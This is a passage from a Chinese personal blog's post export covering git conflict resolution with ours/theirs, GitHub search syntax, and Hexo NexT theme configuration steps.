    <content><![CDATA[<h1 id="使用-ours-和-theirs-解决合并冲突"><a href="#使用-ours-和-theirs-解决合并冲突" class="headerlink" title="使用 ours 和 theirs 解决合并冲突"></a>使用 <code>ours</code> 和 <code>theirs</code> 解决合并冲突</h1><p>在使用 git 工程中,合并时产生冲突是很常见的，在使用 <code>merge</code> 和 <code>rebase</code> 合并时都会出现冲突情况，设计到很多文件，而冲突一般是只选择保留一方，这就可通过使用 <code>ours</code> 和 <code>theirs</code> 解决冲突。</p>
<h2 id="merge-与-rebase-合并的区别"><a href="#merge-与-rebase-合并的区别" class="headerlink" title="merge 与 rebase 合并的区别"></a><code>merge</code> 与 <code>rebase</code> 合并的区别</h2><p>假设 <code>main</code> 主分支基础上生成了分支 <code>branch_B</code> 各自都有一些提交,现需要将 <code>branch_B</code> 合并到 <code>main</code></p>
<p>执行 <code>git merge branch_B main</code> 后分支状态:</p>
<blockquote>
<p>main —— A —— B ——- D (main)<br>   \                   /<br>    \ branch_B —— C /</p>
</blockquote>
<p><code>merge</code> 会抽取两个分支上新增的提交，并将其合并在一起，产生一个新的提交D，生成的D节点有两个父节点，在合并的过程中可能会发生冲突</p>
<a id="more"></a>
<p>执行 <code>git rebase branch_B main</code></p>
<blockquote>
<p>main —— A —— B —— C’ —— D (main)<br>   \                   /<br>    \ branch_B —— C /</p>
</blockquote>
<p><code>rebase</code> 会以<code>branch_B</code>为参照，提取 <code>branch_B</code> 分支上的提交，将这些修改作用在 <code>main</code> 分支上，最终结果不会产生新的提交节点。在将提取的修改作用在 <code>main</code> 的过程中可能会发生冲突</p>
<p>通常使用过程中最常用的是 <code>rebase</code> 。</p>
<h2 id="rebase-冲突解决"><a href="#rebase-冲突解决" class="headerlink" title="rebase 冲突解决"></a><code>rebase</code> 冲突解决</h2><p>产生冲突后 <code>git</code> 会自动在文件中标记出冲突的部分:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">&lt;main 的内容(ours)&gt;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&lt;branch_B 的内容(theirs)&gt;</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; 提交ID及信息</span><br></pre></td></tr></table></figure>
<p>使用 <code>git checkout --conflict=diff3 &lt;fileName&gt;</code> 通过选项 <code>diff3</code> git 会用不同版本来标记冲突： 提供 <code>ours</code> 、 <code>theirs</code> 和 <code>base</code> 版本，通过设置 <code>merge.conflictstyle</code> 选项为 <code>diff3</code> 做为以后合并冲突的默认选项 : <code>git config --global merge.conflictstyle diff3</code> ,  <code>merge</code> (默认选项)选项提供 <code>ours</code> 和 <code>theirs</code> 版本标记</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; ours</span><br><span class="line">&lt;main 的内容(ours)&gt;</span><br><span class="line">||||||| base</span><br><span class="line">&lt;base(基) 的内容&gt;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&lt;branch_B 的内容(theirs)&gt;</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; 提交ID及信息</span><br></pre></td></tr></table></figure>
<h3 id="冲突解决步骤"><a href="#冲突解决步骤" class="headerlink" title="冲突解决步骤"></a>冲突解决步骤</h3><ul>
<li>使用 <code>oers</code> 或 <code>theirs</code>选择要保留一方的提交，git将自动将保留修改</li>
<li>将修改后的文件添加</li>
<li>使用<code>--continue</code>选项继续执行 <code>rebase</code> 合并</li>
<li>查看冲突状态</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git checkout --ours &lt;fileName&gt;</span><br><span class="line">git add &lt;fileName&gt;</span><br><span class="line">git rebase --<span class="built_in">continue</span></span><br><span class="line">git status</span><br></pre></td></tr></table></figure>
<p>当出现多个文件存在冲突可使用脚本解决。<br>在解决冲突过程中，如果遇到某个提交记录不需要应用，可使用<code>git rebase --skip</code> 忽略，或使用 <code>git rebase --abort</code> 取消本次 rebase 。</p>
<h1 id="git-status-中文乱码"><a href="#git-status-中文乱码" class="headerlink" title="git status 中文乱码"></a>git status 中文乱码</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git status</span><br><span class="line">....</span><br><span class="line"><span class="string">&quot;38\344\270\273\347\233\256\345\275\225\344\270\213\346\226\207\344\273\266\345\244\271\350\257\264\346\230\216&quot;</span></span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解决方法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global core.quotepath <span class="literal">false</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Github高效搜索仓库语法</title>
    <url>/posts/1c88466d/</url>
    <content><![CDATA[<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p><strong>对用空格的查询可使用引号</strong>如:<code>“hello worled”</code></p>
<h2 id="按仓库名、自述文件内容搜索"><a href="#按仓库名、自述文件内容搜索" class="headerlink" title="按仓库名、自述文件内容搜索"></a>按仓库名、自述文件内容搜索</h2><a id="more"></a>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>test in:name</code></td>
<td style="text-align:center">搜索名称包含<code>test</code>的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test in:description</code></td>
<td style="text-align:center">搜索名称或自述文件包含<code>test</code>的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test in:readme</code></td>
<td style="text-align:center">搜索自述文件包含<code>test</code>的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>repo:test</code></td>
<td style="text-align:center">搜索以<code>test</code>为名的仓库</td>
</tr>
</tbody>
</table>
</div>
<h2 id="指定范围搜索"><a href="#指定范围搜索" class="headerlink" title="指定范围搜索"></a>指定范围搜索</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>user:user_name</code></td>
<td style="text-align:center">指定搜索<code>user_name</code>用户的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>org:org_name</code></td>
<td style="text-align:center">指定搜索<code>org_name</code>组织的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>size:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>大小的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>stars:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>星数的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>forks:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>分支数的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test fork:true</code></td>
<td style="text-align:center">搜索名称含<code>test</code>的仓库，包括分支仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test fork:only</code></td>
<td style="text-align:center">只搜索名称包含<code>test</code>分支仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>followers:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>关注数的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>created:t</code></td>
<td style="text-align:center">指定创建时间<code>t</code>搜索仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>pushed:t</code></td>
<td style="text-align:center">指定更新时间<code>t</code>搜索仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>language:LANGUAGE</code></td>
<td style="text-align:center">指定计算机语言搜索</td>
</tr>
</tbody>
</table>
</div>
<h2 id="范围规定"><a href="#范围规定" class="headerlink" title="范围规定"></a>范围规定</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">范围</th>
<th style="text-align:center">示例</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&gt;x</code></td>
<td style="text-align:center"><code>&gt;10</code>,<code>&gt;1998-04-06</code></td>
<td style="text-align:center">大于1000;1998年4月6日及之后</td>
</tr>
<tr>
<td style="text-align:center"><code>&gt;=x</code></td>
<td style="text-align:center"><code>&gt;=10</code>,<code>&gt;=1998-04-06</code></td>
<td style="text-align:center">大于等于1000;1998年4月6日之后</td>
</tr>
<tr>
<td style="text-align:center"><code>&lt;x</code></td>
<td style="text-align:center"><code>&lt;10</code>,<code>&lt;1998-04-06</code></td>
<td style="text-align:center">小于1000;1998年4月6日及之前</td>
</tr>
<tr>
<td style="text-align:center"><code>&lt;=x</code></td>
<td style="text-align:center"><code>&lt;=10</code>,<code>&lt;=1998-04-06</code></td>
<td style="text-align:center">小于等于1000;1998年4月6日之前</td>
</tr>
<tr>
<td style="text-align:center"><code>x..*</code></td>
<td style="text-align:center"><code>10..*</code>,<code>1998-04-06..*</code></td>
<td style="text-align:center">等同于<code>&gt;=x</code></td>
</tr>
<tr>
<td style="text-align:center"><code>**..x</code></td>
<td style="text-align:center"><code>*..10</code>,<code>*..1998-04-06</code></td>
<td style="text-align:center">等同于<code>&lt;=x</code></td>
</tr>
<tr>
<td style="text-align:center"><code>x..x</code></td>
<td style="text-align:center"><code>10..100</code>,<code>1998-04-06..1999-04-07</code></td>
<td style="text-align:center">10到100间;1998.4.6~1999.4.7间</td>
</tr>
</tbody>
</table>
</div>
<h2 id="排除"><a href="#排除" class="headerlink" title="排除"></a>排除</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">说明示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>NOT</code></td>
<td style="text-align:center"><code>hello NOT world</code>匹配含<code>hello</code>d但不含<code>world</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-QUALIFIER</code></td>
<td style="text-align:center"><code>-指令</code>(减指令),如<code>-language:javascript</code>(减去JavaScript编写的)</td>
</tr>
</tbody>
</table>
</div>
<p>参考：<a href="https://help.github.com/cn/github/searching-for-information-on-github">https://help.github.com/cn/github/searching-for-information-on-github</a></p>
]]></content>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题更新美化</title>
    <url>/posts/d6d67009/</url>
    <content><![CDATA[<h1 id="Hexo-next-主题配置美化"><a href="#Hexo-next-主题配置美化" class="headerlink" title="Hexo next 主题配置美化"></a>Hexo next 主题配置美化</h1><p> <strong>在博客根目录下操作</strong></p>
<h2 id="下载使用next主题"><a href="#下载使用next主题" class="headerlink" title="下载使用next主题"></a>下载使用next主题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line">vim _config.yml		<span class="comment">#修改配置使用主题</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">theme:next</span></span><br></pre></td></tr></table></figure>
<p><strong>官方不建议直接修改主题文件下的内容，这不利于升级</strong><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cp themes/next/_config.yml _config.next.yml  <span class="comment"># 复制主题文件到主目录</span></span><br></pre></td></tr></table></figure></p>
<p>Hexo 配置文件(<code>$blog/_config.yml</code>)中的 <code>theme_config</code> 的优先级最高，其次是 <code>$blog/_config.[theme].yml</code> 文件，最后是位于主题目录下的 <code>_config.yml</code> 文件</p>
<a id="more"></a>
<h2 id="博客配置文件基础配置"><a href="#博客配置文件基础配置" class="headerlink" title="博客配置文件基础配置"></a>博客配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: 木He寸&amp;eonun&#39;s Blog			#标题</span><br><span class="line">subtitle: 记录积累方有成长		#副标题</span><br><span class="line">description: 你只需努力，其他任由天意！	#描述</span><br><span class="line">keywords:</span><br><span class="line">author: 木He寸&amp;eonun		#作者</span><br><span class="line">language: zh-CN		 #语言</span><br><span class="line">timezone: Asia&#x2F;Shanghai		#时区</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">url: https:&#x2F;&#x2F;eonun.com		#域名</span><br><span class="line"></span><br><span class="line"># Directory</span><br><span class="line">skip_render: README.md 	# 部署的时候不包含的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="next主题主配置文件基础配置"><a href="#next主题主配置文件基础配置" class="headerlink" title="next主题主配置文件基础配置"></a>next主题主配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml</span><br></pre></td></tr></table></figure>
<h3 id="主题样式配置"><a href="#主题样式配置" class="headerlink" title="主题样式配置"></a>主题样式配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes	#选择一个主题样式，去掉前面的注释，将不用的主题样式注释掉</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>
<h3 id="菜单栏配置"><a href="#菜单栏配置" class="headerlink" title="菜单栏配置"></a>菜单栏配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span>	<span class="comment">#将需要的菜单取消注释即可，顺便换一下顺序</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-heartbeat</span></span><br></pre></td></tr></table></figure>
<p><a href="https://link.jianshu.com/?t=http%3A%2F%2Ffontawesome.io%2Ficons%2F">Font Awesome</a></p>
<h3 id="添加模块"><a href="#添加模块" class="headerlink" title="添加模块"></a>添加模块</h3><ul>
<li><strong>分类模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page categories</span><br><span class="line">vim <span class="built_in">source</span>/categories/index.md	<span class="comment">#修改</span></span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-07-19 13:04:16</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>给文章在顶部添加<code>categories</code>字段，即可自动创建分类名并加入对应的分类中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="section">#单个分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: 分类名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">#有子分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: [1级分类,2级分类,3级分类,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: </span><br><span class="line"><span class="bullet">-</span> 1级分类</span><br><span class="line"><span class="bullet">-</span> 2级分类</span><br><span class="line"><span class="bullet">-</span> 3级分类</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>标签模块</strong></li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">hexo n page <span class="keyword">tags</span></span><br><span class="line"><span class="keyword">vim</span> <span class="keyword">source</span>/<span class="keyword">tags</span>/<span class="built_in">index</span>.md	#comment<span class="variable">s:false</span>是关闭评论</span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-07-19 13:04:24</span><br><span class="line">type: tags</span><br><span class="line">comments:false</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>给文章在顶部添加<code>tags</code>字段，即可自动创建标签名并归入对应的标签中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">title: 这是文章标题</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> 标签1</span><br><span class="line"><span class="bullet">-</span> 标签2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关于模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page about</span><br></pre></td></tr></table></figure>
<p>生成<code>source/about/index.md</code>，打开<code>index.md</code>文件即可编辑个人相关信息</p>
<ul>
<li><strong>本地搜索模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-searchdb	<span class="comment">#安装搜索插件</span></span><br><span class="line">vim _config.yml	<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在Extensions下添加搜索配置模块</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启搜索模块</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>	<span class="comment"># auto 通过输入触发， manual 通过回车键触发</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span>	<span class="comment">#设置显示每篇文章前n个结果， -1 为全部结果</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span>	<span class="comment">#Unescape html字符串到可读的字符串</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>全文阅读</strong></li>
</ul>
<p>博客主页会有多篇文章，如果想让你的文章只显示一部分，多余内容需要点击阅读全文来查看，那么就需要在的文章中添加：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--more--&gt;</span></span><br></pre></td></tr></table></figure>
<p>在它后面的内容会被隐藏，当点击阅读全文才能看到<br>可将其添加到模板文件(<code>scaffolds/post.md</code>) 中，每次创建新文章都自动添加</p>
<h2 id="头像图标"><a href="#头像图标" class="headerlink" title="头像图标"></a>头像图标</h2><p>将头像图标文件放到 <code>$blog/source/images</code> 下</p>
<h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/me.png</span>	<span class="comment">#头像路径</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>	<span class="comment">#头像是否为圆形显示</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span>	<span class="comment">#鼠标到头像上是否旋转头像</span></span><br></pre></td></tr></table></figure>
<h3 id="博客网站图标"><a href="#博客网站图标" class="headerlink" title="博客网站图标"></a>博客网站图标</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/logo-16px.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.png</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>
<h2 id="侧栏配置"><a href="#侧栏配置" class="headerlink" title="侧栏配置"></a>侧栏配置</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position, available values: left | right (only for Pisces | Gemini).</span></span><br><span class="line">  <span class="comment">#边栏位置（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span>	<span class="comment">#左边</span></span><br><span class="line">  <span class="comment">#position: right	#右边</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Manual define the sidebar width. If commented, will be default for:</span></span><br><span class="line">  <span class="comment"># Muse | Mist: 320</span></span><br><span class="line">  <span class="comment"># Pisces | Gemini: 240</span></span><br><span class="line">  <span class="comment">#width: 300	#侧栏宽度，注释就用默认值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display, available values (only for Muse | Mist):</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  				<span class="comment">#在文章页面（拥有目录列表）时显示</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都显示</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都隐藏（可以手动展开）</span></span><br><span class="line">  <span class="comment">#  - remove  totally remove sidebar including sidebar toggle.</span></span><br><span class="line">  				<span class="comment">#完全移除</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span>	<span class="comment">#侧栏显示时机（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="attr">offset:</span> <span class="number">12</span>	<span class="comment">#文章间距（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">false</span>	<span class="comment">#在窄视图上启用侧栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">dimmer:</span> <span class="literal">false</span>		<span class="comment">#单击任何页面的空白部分关闭栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">back2top:</span>	<span class="comment">#返回顶部</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span>	<span class="comment">#将回到顶部按钮放到侧边栏</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span>	<span class="comment">#在回到顶部按钮上显示百分百</span></span><br></pre></td></tr></table></figure>
<h2 id="访问计数"><a href="#访问计数" class="headerlink" title="访问计数"></a>访问计数</h2><p>用的是<a href="http://busuanzi.ibruce.info/">不蒜子脚本</a>来达到计数目的的</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show Views / Visitors of the website / page with busuanzi.</span></span><br><span class="line"><span class="comment"># Get more information on http://ibruce.info/2015/04/04/busuanzi</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>		<span class="comment">#开启不蒜子计数</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">eye</span></span><br></pre></td></tr></table></figure>
<p>若显示出错可到不蒜子官网查询到<a href="http://ibruce.info/2015/04/04/busuanzi">最新脚本变化</a><br>在本地查看的变量是错误, <code>hexo c</code> ,<code>hexo d</code>之后打开网页,就能看到正确的访问人数</p>
<h2 id="阅读书签"><a href="#阅读书签" class="headerlink" title="阅读书签"></a>阅读书签</h2><p>用于记录本次阅读文章的位置，下次访问直接打开到上次的位置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Bookmark Support</span></span><br><span class="line"><span class="attr">bookmark:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">save:</span> <span class="string">auto</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏目录"><a href="#侧边栏目录" class="headerlink" title="侧边栏目录"></a>侧边栏目录</h2><p>在写文章是通常会有给标题编号的情况，但主题默认也会给加上一个编号，这样就会有些多余，关闭自动编号只需在侧边栏目录配置关闭即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Table Of Contents in the Sidebar	#边栏中的目录</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">	</span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span>	<span class="comment">#自动将列表编号添加到toc	修改为false就不会自动标号了</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span>	<span class="comment">#如果为true，如果标题宽度大于侧边栏宽度，则所有单词将放在下一行。</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span>	<span class="comment">#如果为true，将显示帖子中的所有TOC级别，而不是其中的已激活部分</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span>	<span class="comment">#生成的toc的最大航向深度。可以通过Front-matter中的`toc_max_depth`在一个帖子中设置它</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏社交链接"><a href="#侧边栏社交链接" class="headerlink" title="侧边栏社交链接"></a>侧边栏社交链接</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/eonun</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:eonun47@gmail.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="attr">Weibo:</span> <span class="string">https://weibo.com/eonun</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="attr">Twitter:</span> <span class="string">https://twitter.com/eonun</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-twitter</span></span><br><span class="line">  <span class="comment">#FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line">  <span class="comment">#StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="comment">#Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏友情链接"><a href="#侧边栏友情链接" class="headerlink" title="侧边栏友情链接"></a>侧边栏友情链接</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_icon:</span> <span class="string">link</span></span><br><span class="line"><span class="attr">links_title:</span> <span class="string">友链</span></span><br><span class="line"><span class="attr">links_layout:</span> <span class="string">block</span></span><br><span class="line"><span class="comment">#links_layout: inline</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="string">Web前端导航:</span> <span class="string">http://www.alloyteam.com/nav/</span></span><br><span class="line">  <span class="string">创造狮导航:</span> <span class="string">http://www.chuangzaoshi.com/code</span></span><br><span class="line">  <span class="string">前端书籍资料:</span> <span class="string">http://www.36zhen.com/t?id=3448</span></span><br></pre></td></tr></table></figure>
